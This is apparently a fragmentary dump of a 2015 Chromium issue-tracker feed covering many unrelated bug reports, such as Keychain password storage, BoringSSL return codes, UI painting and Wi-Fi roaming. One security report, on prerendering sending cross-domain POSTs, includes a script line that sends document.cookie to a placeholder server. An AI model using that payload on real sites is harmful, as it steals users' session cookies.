This manifests itself as the “Local Items” keychain in Keychain Access. Items in this keychain are only accessible to applications with the keychain-access-groups entitlement [1][2]. This, like other iCloud entitlements, is “available only to apps submitted to the App Store or to the Mac App Store” [3].\r\n\r\nThe effect of this is that on 10.9 and 10.10, passwords stored in Safari are not accessible to Chrome (but passwords originated in Chrome are still shared to Safari):\r\n\r\n1. User logs into a website with Safari and saves the password\r\n2. User opens Chrome and goes to same website\r\n3. Chrome cannot autofill the password from (1), since it does not have the entitlement to access the iCloud keychain\r\n\r\nStarting in 10.10, passwords stored in Chrome and accessed in Safari are duplicated, preventing updates from being shared:\r\n\r\n1. User logs into a website in Chrome and saves the password\r\n2. User opens Safari and goes to the same website\r\n3. Safari fills the password and copies it from the “login” keychain to “Local Items”\r\n4. Any updates to the password in Safari are not shared to Chrome, since Safari has duplicated the item\r\n\r\nGiven that Safari no longer makes password sharing possible, and Firefox does not integrate with the keychain, there seems to be very little value to continuing to store individual password items in the Keychain. The integration regularly causes confusion and problems when using multiple profiles and Chrome Sync, since passwords are not isolated per-profile.\r\n\r\nIn addition, the new kSecAttrSynchronizable is only usable via an entirely new set of Keychain APIs, which would require rewriting all the Keychain integration code anyways. Given that Chrome on OS X is not currently submittable to the App Store (nor are there any intentions of making this possible), on the latest OS (10.10) password sharing is completely broken, and that Keychain integration can cause issues for users, I think we should consider removing it. Instead, I think we should use Chrome’s encryptor for saving passwords and only place the encryptor key in the Keychain.\r\n\r\nIf we decide to do this, we should figure out what the migration path needs to be.\r\n\r\n[1] https://developer.apple.com/library/ios/documentation/Security/Reference/keychainservices/#//apple_ref/c/func/SecItemAdd\r\n[2] http://opensource.apple.com/source/Security/Security-57031.1.35/Security/sec/ipc/server.c SecTaskCopyAccessGroups()\r\n[3] https://developer.apple.com/library/mac/documentation/General/Conceptual/iCloudDesignGuide/Chapters/Introduction.html","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466638/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466638"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466638"}],"author":[{"name":{"$t":"rsesek@chromium.org"},"uri":{"$t":"/u/rsesek@chromium.org/"}}],"issues$blocking":[{"issues$id":{"$t":474954},"issues$project":{"$t":"chromium"}}],"issues$cc":[{"issues$uri":{"$t":"/u/stuartmorgan@chromium.org/"},"issues$username":{"$t":"stuartmorgan@chromium.org"}},{"issues$uri":{"$t":"/u/pinkerton@chromium.org/"},"issues$username":{"$t":"pinkerton@chromium.org"}},{"issues$uri":{"$t":"/u/mark@chromium.org/"},"issues$username":{"$t":"mark@chromium.org"}},{"issues$uri":{"$t":"/u/rsleevi@chromium.org/"},"issues$username":{"$t":"rsleevi@chromium.org"}},{"issues$uri":{"$t":"/u/wfh@chromium.org/"},"issues$username":{"$t":"wfh@chromium.org"}},{"issues$uri":{"$t":"/u/112414029249956272568/"},"issues$username":{"$t":"erikc...@chromium.org"}},{"issues$uri":{"$t":"/u/vabr@chromium.org/"},"issues$username":{"$t":"vabr@chromium.org"}},{"issues$uri":{"$t":"/u/110285217826430949027/"},"issues$username":{"$t":"eng...@chromium.org"}}],"issues$id":{"$t":466638},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-UI-Browser-Passwords"},{"$t":"OS-Mac"}],"issues$stars":{"$t":6},"issues$state":{"$t":"open"},"issues$status":{"$t":"Available"}},{"gd$etag":"W/\"C0IBRH47eCl7ImA9XRRaEEg.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466636"},"published":{"$t":"2015-03-12T15:06:35.000Z"},"updated":{"$t":"2015-04-14T22:45:55.000Z"},"title":{"$t":"Font-feature-settings property is killing tab symbols"},"content":{"$t":"Chrome Version       : 41.0.2272.74\r\nOS Version: OS X 10.10.2\r\n\u003cb\u003eURLs (if applicable) :\u003c/b\u003e\nOther browsers tested:\r\n  Add OK or FAIL after other browsers where you have tested this issue:\r\n     Safari 5: OK\r\n  Firefox 4.x: OK\r\n     IE 7/8/9: OK\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.

Yes 40M\r\n\r\nChrome version: 41.0.2272.89  Channel: stable\r\nOS Version: 6.1 (Windows 7, Windows Server 2008 R2)\r\nFlash Version: Shockwave Flash 17.0 r0\r\n\r\nTo resolve this, you need to close both the platform app and chrome for the chrome.serial.getDevices to clear the broken virtual serial port.\r\nWhile this is &quot;bad&quot; when you first look at this, let me make it worse, because i am hoping this bug will get higher priority due to the fact that it breaks functionality\r\nin a very bad way in certain scenarios.\r\n\r\nIn my case, i am using the chrome.usb.getDevices to check if certain device is present, if it is, i execute a special reboot routine to get the arduino in a state that i want it to,\r\nwith this bug present, the whole sequence fails (because the virtual port doesn't disappear and reappear) during/after reboot, which leaves the serial port completely dead state.\r\nI already have quite a few users being &quot;angry&quot; at me since they can't use the hardware they paid for :/\r\n\r\nI didn't write a demo code for this (since this problem highly rely on a device that creates a virtual serial port), anyone dealing with the serial/usb api should be able to reproduce it, if not, i am willing to write a demo.\r\nKeep in mind that using chrome.usb.getDevices requires an optional usb permissions which you need to get through chrome.permissions.request","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466578/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466578"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466578"}],"author":[{"name":{"$t":"cTndesig...@gmail.com"},"uri":{"$t":"/u/111972072599145289237/"}}],"issues$closedDate":{"$t":"2015-03-23T22:59:48.000Z"},"issues$id":{"$t":466578},"issues$label":[{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug-Regression"},{"$t":"OS-Windows"},{"$t":"Arch-x86_64"},{"$t":"Cr-Platform-Apps-API"},{"$t":"M-42"},{"$t":"Hotlist-Merge-Approved"},{"$t":"merge-merged-2311"}],"issues$owner":{"issues$uri":{"$t":"/u/109767061269845799419/"},"issues$username":{"$t":"reil...@chromium.org"}},"issues$stars":{"$t":5},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Verified"}},{"gd$etag":"W/\"CkcBQ347eCl7ImA9XRRVEUo.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466577"},"published":{"$t":"2015-03-12T10:53:41.000Z"},"updated":{"$t":"2015-03-12T14:20:52.000Z"},"title":{"$t":"Long DNS name doesn't resolve"},"content":{"$t":"UserAgent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36\r\n\r\nExample URL:\r\nhttp://twas.brillig.and.the.slithy.toves.did.gyre.and.gimble.in.the.wabe.all.mimsy.were.the.borogoves.and.the.mome.raths.outgrabe.jabberwocky.com\r\n\r\nSteps to reproduce the problem:\r\n1.

After installing or upgrading Chrome browser in Ubuntu x86_64 (all versions of Chrome not Chromium) from 3rd. party repositories &quot;deb http://dl.google.com/linux/chrome/deb/ stable main&quot;.\r\n2.

When its open in 3rd. party launcher docks not Unity (Im using Docky).\r\n\r\nWhat went wrong?\r\nAfter upgrading Chrome browser (all versions - not Chromium because its working fine) in Ubuntu (all versions).

After this Chrome open fine in the same launcher icon in Docky. In default Ubuntu Chromium installation it works fine just in Chrome browser.\r\nIt is really annoying everytime do this after upgrade Chrome. Because it is upgraded very frequently.\r\nI pinned my moddified Chrome launcher to see what I add at the end of each section to solve this problem.\r\n\r\nDid this work before?

It's not immediately obvious to me if we want the same key to *also* specify whether to use gyp or gn, or if those should be two independent keyed values.\r\n\r\nThis would allow us to strip almost all specific knowledge of GYP_DEFINES and gn args out of the chromium build recipes.\r\n\r\nIn addition, it would be nice if we had a way to specify some way to run gyp_chromium or gn multiple times w/ multiple different settings from a single config. For example, developers might want to make sure they have both gyp and gn build dirs that are kept up-to-date and in sync, or they might want to support linux, android, and chromeos build dirs from a single checkout.\r\n\r\nLastly, there have been multiple requests to support environment variables and/or some equivalent to ~/.gyp/includes.gypi so that developers can specify common flags that are shared across multiple GN build dirs or checkouts. 'gn args' has the nice property that everything is self-contained in args.gn, but so we don't necessarily want to change that, but it might be a good idea to prototype something in a wrapper given that we need to write something for the above reasons anyway.\r\n\r\nI believe many developers have various shell functions/aliases/scripts that automate many of these things, but since we need something for the bots to be able to call anyway, it might be good to try and centralize user and bot needs here assuming they're not *too* different.\r\n\r\nNote that there is also the 'cr' tool, as documented in https://code.google.com/p/chromium/wiki/CRUserManual, but I don't think there's a huge amount of overlap.

This is super costly compared to pre-impl-side painting because ui painting code is not at all optimized to be fast.\r\n\r\nPreviously this worked out okay, because we would work hard to limit which views we asked to paint, so inefficiencies were amortized. When we record a whole tile, many views are painting much more often, and things show up like\r\na) Allocating bitmaps every frame for the spinner graphics\r\nb) Creating a new RenderText every frame and doing layout on it\r\netc...\r\n\r\nThis takes our record+raster of 0.5ms to a record-only of 1.4ms, which is Bad.\r\n\r\nTo get this time back I believe we need to\r\na) stop doing this lossy &quot;a view is invalidated&quot; -&gt; &quot;an invalidation rect&quot; -&gt; &quot;a paint rect&quot; -&gt; &quot;which views should paint&quot; thing, and only do painting on views that are actually dirty\r\nb) cache the paint output from each view so that we can reuse non-dirty views' previous paint output.\r\n\r\nOriginally we thought about implementing a custom UI RecordingSource that would instead of having tiled pictures could hold a picture for each view. This would require a UI PictureLayer with a different API for painting than the current ContentLayerClient, allowing ui::Layer to pass back a set of pictures with offsets and replace individual pictures.\r\n\r\nThen we thought about having each view store its own skpicture at the time that it becomes dirty, and &quot;recording&quot; becomes the View calling SkCanvas::drawPicture(itspicture). We hoped that drawPicture would just hold a ref to the picture, but instead of plays back all of the commands into the new recording, which is entirely new (wasted) overhead. So we wanted to eliminate this extra indirection via SkCanvas.\r\n\r\nThen we considered using the new slimming paint DisplayList structures. This has the advantage of reusing the work Ali and folks have done in cc for the DisplayListRecordingSource and DisplayListRasterSource.\r\n\r\nThe thought here is that ui::Layer would own a DisplayList, and when it goes to paint, it would walk through the view tree in paint order, and for each view, the view would emit a DisplayListItem (which is backed by an SkPicture). The ui::Layer would collect all of the DisplayListItems and give them to cc.\r\n\r\nFor each View, the Paint function will use a &quot;am i invalidated&quot; flag of some sort, to decide if it should make a new SkPicture, or reuse its old one. If it needs to make a new one, it will make an SkRecorder (SkCanvas backed by SkPicture) and give that to the old painting code. The result will be cached on the View.\r\n\r\nWe want to be able to do some culling, but RTree level culling within each view's SkPicture would be wasted overhead, as individual views are not large with complex pieces far from each other.\r\n\r\nInstead, we can probably enhance the DisplayList and its Recording/RasterSource to hold and use Layer-space bounding boxes for each DisplayListItem and cull DisplayListItems during raster if they don't intersect the raster tile.\r\n\r\nCurrently for blink we do this type of culling by playing all the DisplayListItems into a single SkPicture (with an RTree in it) and then raster from that, but this is wasted overhead, as per our 2nd thought above.\r\n\r\nWe believe this should bring us back to a recording time in line with where we are now, and it would be significantly better in cases where we have views falling into the dirty rect that are not themselves invalidated (eg overlapping views).\r\n\r\n\r\nThis does not address the costs of raster/upload full tiles, that remains a separate issue as 462792.\r\n\r\nIn order to address these for the spinner case, we thought about promoting it to its own layer. But there are other content-based animations such as the animated highlight when you mouse over a tab. It would handle the most common case though, wrt to reducing the raster/upload work.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466426/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466426"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466426"}],"author":[{"name":{"$t":"danakj@chromium.org"},"uri":{"$t":"/u/danakj@chromium.org/"}}],"issues$blocking":[{"issues$id":{"$t":314185},"issues$project":{"$t":"chromium"}}],"issues$cc":[{"issues$uri":{"$t":"/u/115137831207547358789/"},"issues$username":{"$t":"weilia...@chromium.org"}},{"issues$uri":{"$t":"/u/enne@chromium.org/"},"issues$username":{"$t":"enne@chromium.org"}},{"issues$uri":{"$t":"/u/danakj@chromium.org/"},"issues$username":{"$t":"danakj@chromium.org"}},{"issues$uri":{"$t":"/u/101396871500167317051/"},"issues$username":{"$t":"vmp...@chromium.org"}},{"issues$uri":{"$t":"/u/chrishtr@chromium.org/"},"issues$username":{"$t":"chrishtr@chromium.org"}},{"issues$uri":{"$t":"/u/102269419957055715600/"},"issues$username":{"$t":"schen...@chromium.org"}},{"issues$uri":{"$t":"/u/sadrul@chromium.org/"},"issues$username":{"$t":"sadrul@chromium.org"}},{"issues$uri":{"$t":"/u/sky@chromium.org/"},"issues$username":{"$t":"sky@chromium.org"}},{"issues$uri":{"$t":"/u/oshima@chromium.org/"},"issues$username":{"$t":"oshima@chromium.org"}},{"issues$uri":{"$t":"/u/reveman@chromium.org/"},"issues$username":{"$t":"reveman@chromium.org"}},{"issues$uri":{"$t":"/u/piman@chromium.org/"},"issues$username":{"$t":"piman@chromium.org"}},{"issues$uri":{"$t":"/u/pdr@chromium.org/"},"issues$username":{"$t":"pdr@chromium.org"}}],"issues$id":{"$t":466426},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Internals-Compositing-Rasterization"},{"$t":"OS-All"},{"$t":"Cr-UI"}],"issues$owner":{"issues$uri":{"$t":"/u/danakj@chromium.org/"},"issues$username":{"$t":"danakj@chromium.org"}},"issues$stars":{"$t":7},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"C04CR347eCl7ImA9XRRVEU4.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466424"},"published":{"$t":"2015-03-12T00:59:47.000Z"},"updated":{"$t":"2015-03-12T03:46:06.000Z"},"title":{"$t":"ARC: L-Rebase: Investigate aapt failures on buildbot"},"content":{"$t":"Buildbots randomly fail on aapt due to apparently missing dependency:\r\n\r\nhttp://chromegw.corp.google.com/i/client.arc/builders/bare_metal-i686-bionic-L_rebase/builds/353\r\nhttp://chromegw.corp.google.com/i/client.arc/builders/bare_metal-i686-bionic-L_rebase/builds/379\r\n\r\nThough retry usually solves the issue, but we need to take a look since this issue is getting more and more annoying.\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466424/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466424"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466424"}],"author":[{"name":{"$t":"n...@chromium.org"},"uri":{"$t":"/u/108503741132298118888/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/108503741132298118888/"},"issues$username":{"$t":"n...@chromium.org"}},{"issues$uri":{"$t":"/u/110626126994090391474/"},"issues$username":{"$t":"uek...@chromium.org"}},{"issues$uri":{"$t":"/u/toyoshim@chromium.org/"},"issues$username":{"$t":"toyoshim@chromium.org"}},{"issues$uri":{"$t":"/u/108002744095335687925/"},"issues$username":{"$t":"lhcha...@chromium.org"}},{"issues$uri":{"$t":"/u/106872816036674832336/"},"issues$username":{"$t":"lpi...@chromium.org"}}],"issues$closedDate":{"$t":"2015-03-12T03:46:06.000Z"},"issues$id":{"$t":466424},"issues$label":[{"$t":"Cr-Platform-ARC"},{"$t":"ArcLRebase"},{"$t":"Pri-1"},{"$t":"Type-Bug"}],"issues$owner":{"issues$uri":{"$t":"/u/108503741132298118888/"},"issues$username":{"$t":"n...@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Fixed"}},{"gd$etag":"W/\"C0MCRH47eCl7ImA9XRRVEU8.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466422"},"published":{"$t":"2015-03-12T00:50:36.000Z"},"updated":{"$t":"2015-03-12T00:51:05.000Z"},"title":{"$t":"Show associated origin with about:blank URLs"},"content":{"$t":"Forking this from bug 50833.

Probably a variant of that callback. Also we can just set not_resumable on the session rather than deal with looking up the session by pointer, which would be much simpler. (We probably shouldn't just do that internally in BoringSSL? BoringSSL can't know that the SSL_SESSION isn't shared across threads. Or that the sessions aren't serialized and deserialized with multiple copies of themselves.)\r\n\r\nAlthough, to be honest, I'm kind of unclear on the point of this clause in the spec.

They are reporting that their devices are failing to roam correctly compared to M40. \r\n\r\nSome direct comments they had regarding some of the performance with their different APs:\r\n\r\nCisco Meraki with M41:\r\nThe roaming function is not working when moving around the location. Instead of changing the Access Point it remains at the old Access Point until NIC restarts. Then find the network again. Sometimes it finds no network at all. Does this happen you have to boot the machine. So we don't recommend the customer to upgrade, this will be a disaster.\r\nWhen I move around in the premises it loses the network (roaming), you stand still it will take about 1 minute and the machine does a restart of the network card. Then it works until you move again. Sometimes it finds the network and try to connect but cannot connect, waited about 2-3 minutes then prompts for the PSK Jensen Wi-Fi (pref network) if I add it doesn't work. It doesn’t see any other network. Have to restart the machine.\r\n\r\nCisco AIR-CAP3602I-E-K9 with M41:\r\nRoaming problem it changes Access Point after some time , no lost Wi-Fi Network \r\n\r\nHP with M41:\r\nRoaming problem it changes Access Point after a long time , no lost Wi-Fi Network. But the speed is below 0,2 Mb and when change  Access Point I get 72 Mb\r\nBut very slow performance for download data\r\n\r\n\r\nThey conducted some tests where they did a very good job of outlining the different times and AP issues they were seeing. That information and the debug log can be seen in this folder:\r\n\r\nhttps://drive.google.com/a/google.com/folderview?id=0B8jS2fcAlKANfnBnM0NhMjFjZDIyYTRZUlZzWE1DcUZhVWxQMFJoSzlJVU5KaTc0SXBnZk0&amp;usp=sharing\r\n\r\nTheir testing period was from 15:30 - 16:07 on 3/9/2015.

Some write failures return -1, some return 0. Receiving fatal alerts return 0. Generic errors tend to return -1. BIO_read returning 0 propagates up. But a 0 return during a handshake done as part of a handshake then gets mapped back to -1. SSL_get_error papers over most of these, but only if the caller knows to call it in all &lt;= 0 cases.\r\n\r\nThis is completely insane and we even have a bug in SSLClientSocketOpenSSL where it fails to account for the 0 return + OPENSSL_PUT_ERROR(fatal alert) craziness.\r\n\r\nI propose the following:\r\n\r\n1. BIO_read always returns -1 on error or retry. It *only* returns 0 on EOF. Audit BIO_METHODs in BoringSSL and Google that they all conform to this. Later we can add a style-guide-conforming variant. (size_t input, size_t output parameter, 0/1 return. EOF should probably return 1, which is a little screwy but otherwise we need to know when to or not to check ERR/errno on zero return.)\r\n\r\n2. BIO_write always returns -1 on error or retry. It *never* returns 0 unless called with input of length 0. I believe this is consistent with POSIX write. Again, this needs an audit and we can later add a new style-guide-confirming variant.\r\n\r\n3. SSL_connect, etc., only return 0/1 per style guide. This would need some careful auditing of Google code. We may need to settle with -1/1. It currently returns 0 all over the place, so 0/1 is probably conceivable, but SSL_get_error only returns retry codes on -1 right now. It's possible some consumer assumes this without failing to account for the 0 + errorqueue =&gt; error case. (Or maybe they're like Chromium and get that case wrong.)\r\n\r\nIf we really have to, this may need to go back to -1/0/1 where -1 is used for errors and 0 is used for transport-level EOF. I suspect we can get away with shadowing transport-level EOFs during a handshake with an SSL_R_UNEXPECTED_EOF. Implicit calls (when you don't SSL_connect yourself and expect SSL_read to do it) already do this. But explicit ones don't, so this will require careful auditing of consumers. But I would like to avoid the tri-state return if possible.\r\n\r\n4. SSL_read and SSL_write will pattern after BIO_read and BIO_write. It *only* returns -1 on error or retry. 0 is *only* returned on either close_notify or transport EOF (outside renego) on SSL_read. SSL_get_error is used to distinguish the latter two when desired. SSL_write *never* returns 0 unless it was passed an input of length 0. Note: this includes if the handshake was aborted with a transport EOF. Those are already mapped to -1 with an error code, so this is consistent with existing behavior.\r\n\r\nAs before, we can consider a new style-guide-conforming variant later and figure out something sane for the EOF case.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466303/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466303"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466303"}],"author":[{"name":{"$t":"davidben@chromium.org"},"uri":{"$t":"/u/davidben@chromium.org/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/113538362264291621688/"},"issues$username":{"$t":"a...@chromium.org"}}],"issues$id":{"$t":466303},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Internals-Network-SSL"},{"$t":"OS-All"}],"issues$owner":{"issues$uri":{"$t":"/u/davidben@chromium.org/"},"issues$username":{"$t":"davidben@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"CUcGR347eCl7ImA9XRRVGEU.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466298"},"published":{"$t":"2015-03-11T20:06:44.000Z"},"updated":{"$t":"2015-03-20T20:23:46.000Z"},"title":{"$t":"OOPIF: Crash when loading a web iframe in an extension page"},"content":{"$t":"Version: 43.0.2329.0\r\nOS: All\r\n\r\n\u003cb\u003eWhat steps will reproduce the problem?\u003c/b\u003e\n1.

Nothing.\r\nI am not signed in into Chrome, I have disabled almost everything. Most of the plugin are disabled also. I am using 2 extensions only, Adblock Plus and CacheKiller. Nothing, the issue still persist.\r\nI have checked again the registry with a program called Nirsoft RegScanner. I have deleted the remaining Chrome/Google keys. Nothing.\r\nI am always checking for adware with 2 kinds of softwares.

Oops - accidentally hit the next line of &quot;Add to dictionary&quot;\r\n4.

(A simple human factors principle.)\r\n\r\nFor example, change the order of &quot;Ask Google for suggestions&quot; and &quot;Add to dictionary&quot;. The &quot;Ask Google...&quot; option is easy to undo - it's just a checkmark. \r\n\r\nThere are other solutions, too.\r\n\r\nWhat went wrong?\r\nIt is too easy to accidentally select &quot;Add to dictionary&quot;. It's the next choice after the list of suggestions (or before the list of selection when the going up the menu). the consequences are difficult to undo. One has to know there is a custom dictionary and how to edit it. Many users don't. Assuming they do, the user needs to go into Setting, then Advance Settings, then get down to the Language button, then scroll that window to expose the dictionary link, then search to find the misspelled word and finally delete. That's a high price for such an easy mistake.\r\n\r\nDid this work before?

Make sure you have the Flash plugin and it is enabled at chrome://plugins .\r\n2. Go to http://s.codepen.io/denilsonsa/debug/OPBROQ? , or to any page that contains an embedded Flash video with HTML5 video as fallback (i.e. &lt;object&gt; with &lt;video&gt; inside).\r\n3. Block the plugin, but do not disable it. There are multiple ways of doing that.\r\n  a. Click at the page icon at the location bar, block plugins for the current site.\r\n  b. Go to Chrome settings (chrome://settings/content) and block all plugins by default, by either requiring click-to-run, or just blocking.\r\n4. Reload the page.\r\n5. Notice that the plugin is not shown anymore (as expected), but there is no way to view the fallback content.\r\n\r\nWhat is the expected behavior?\r\nI expected that the plugin would be blocked (and it was), and that Chrome would, instead, display the fallback content (the HTML5 video).\r\n\r\nSo, I expected that when right-clicking on the blocked plugin there would be an option to &quot;switch to fallback&quot;. Or that &quot;hide the plugin&quot; would switch to fallback.\r\n\r\nWhat went wrong?\r\nIt is impossible to view the fallback content if the plugin is blocked.\r\n\r\nThe only way to view the fallback content is by globally disabling the plugin at chrome://plugins .\r\n\r\nDoes it occur on multiple sites: Yes\r\n\r\nIs it a problem with a plugin? Yes Flash (but could be with other plugins as well\r\n\r\nDid this work before? No \r\n\r\nDoes this work in other browsers? No Firefox 30.0\r\n\r\nChrome version: 41.0.2272.76  Channel: n/a\r\nOS Version: Ubuntu\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nFirefox 30.0 has the exact same behavior.\r\n\r\nIn my opinion, this behavior is not helpful, or is not as helpful as it should be. In my opinion, if the plugin is blocked, it should behave somewhat like if the plugin was disabled or not installed, meaning that the fallback content should be shown instead. That's why it's fallback anyway!\r\n\r\nSince some people might want to selectively enable some blocked plugins (by clicking-to-run or by right-clicking), I believe we should also provide a way to show the fallback instead of just blocking. Either show the fallback by default if the plugin is blocked, or right-click-to-show-the-fallback.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/466097/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=466097"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/466097"}],"author":[{"name":{"$t":"denilsonsa"},"uri":{"$t":"/u/denilsonsa/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/115334551602229615500/"},"issues$username":{"$t":"msrchan...@chromium.org"}}],"issues$id":{"$t":466097},"issues$label":[{"$t":"Cr-Content"},{"$t":"Pri-2"},{"$t":"Via-Wizard"},{"$t":"Type-Bug"},{"$t":"OS-Linux"},{"$t":"Needs-Feedback"}],"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Unconfirmed"}},{"gd$etag":"W/\"CEQAQX47eCl7ImA9XRRVE0s.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/466094"},"published":{"$t":"2015-03-11T14:10:55.000Z"},"updated":{"$t":"2015-03-14T19:45:40.000Z"},"title":{"$t":"DevTools: support sourcemaps for inline stylesheets"},"content":{"$t":"ATM, in order to make sourcemaps for inline stylesheets work properly,\r\none should setup both unique sourceURL for every inline stylesheets and sourceMappinURL:\r\n\r\n&lt;style&gt;\r\nbody{color:blue}\r\n/*# sourceURL=http://localhost:4321/inline-style-1.css */\r\n/*# sourceMappingUrl=a.css.map */\r\n&lt;/style&gt;\r\n\r\n&lt;style&gt;\r\ndiv{color:green}\r\n/*# sourceURL=http://localhost:4321/inline-style-2.css */\r\n/*# sourceMappingUrl=b.css.map */\r\n&lt;/style&gt;\r\n\r\n\r\nHowever, this is a workaround.

Based on stats we've gathered it could be as high as 12% of calls (better data is hard to capture because a one-way audio call is almost impossible to distinguish from a very short call).\r\n\r\nAs a reminder, these are situations where, even though an RTCPeerConnection is established between browsers, one browser fails to send any RTP to the other browser. In Chrome 38, this behavior was linked to a 0 audio input level (indicating a problem getting access to the mic), but in Chrome 41 we now see the behavior happening with non-zero audio input levels. \r\n\r\nOur QA team is working on finding a way to consistently reproduce the problem, but many of us in-office have had hit-and-miss experiences with it, and we have a huge number of customer complaints.\r\n\r\nWill pass along more information as we gather it. Let me know if you have any ideas on how we could mitigate this issue.\r\n\r\nWhat is the expected behavior?\r\n\r\nWhat went wrong?\r\nNo outgoing audio on several calls using a USB headset on Mac OS X.\r\n\r\nDid this work before?

If a user visits a webpage that takes advantage of prerendering (such as Google), the browser automatically fetches the URL that the user is most likely to visit next. If the URL that is fetched has javascript that initiates a POST XmlHttpRequest, the user will execute this code and send the POST request (even to another domain). This allows for redirection and directly violates the design document of prerendering (http://www.chromium.org/developers/design-documents/prerender) which specifies that &quot;any non-GET, HEAD, or OPTION requests from XmlHttpRequests will not be sent over the network and the page will be cancelled.&quot;\r\nIn the example I describe below, I put javascript code on my homepage that initiates a POST XmlHttpRequest to a third party server. If I do a Google search in which my webpage is the first search result, that code gets executed through the prerendering engine and a POST request is sent to the third party server.\r\n\r\n\u003cb\u003eVERSION\u003c/b\u003e\nChrome Version: 40.0.2214.115 (64-bit)\r\nOperating System: Mac OSX Yosemite (Version 10.10) \r\n\r\n\u003cb\u003eREPRODUCTION CASE\u003c/b\u003e\nI have the following code on my homepage at www.synprint.com:\r\n&lt;script&gt;xmlHttp = new XMLHttpRequest();xmlHttp.open( &quot;POST&quot;, &quot;http://&lt;server ip&gt;/crazy.txt?q=&lt;script&gt;alert(&quot;+document.cookie+&quot;)&lt;\\/script&gt;&quot;, false );xmlHttp.send( null );document.write(xmlHttp.responseText)&lt;/script&gt;\r\n\r\nThis code is executed when I visit the following link using Chrome with prerendering on:\r\nhttps://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=synprint+remote\r\nScreenshot attached: google_screenshot.png\r\n\r\nThe POST request is sent to the destination server &lt;server ip&gt; with the client's cookie.

This means, for example, that auto-hide panels fail to unhide from the edges of the screen (observed with Cinnamon desktop on Ubuntu).\r\n\r\n\u003cb\u003ePlease use labels and text to provide additional information.\u003c/b\u003e\n* I see this problem using AppsV2, but not with the legacy V1 app.\r\n* The problem tends to happen when moving the mouse slowly. Moving the mouse quickly seems to hit the extreme edge more reliably.\r\n* The problem occurs whether the app window is restored, maximized, or is in full-screen mode.\r\n* The top edge seems to be much easier to hit than the other 3 edges. I wasn't able to repro the problem with the top edge at all.\r\n* In full-screen mode (with 1-1 client/host scaling), I compared local mouse coordinates with the remotely injected position. Values matched up exactly. In a maximized window, the coordinates were offset by (1, 33), so for example, if the local mouse position were (101, 133), the position in the host system would be (100, 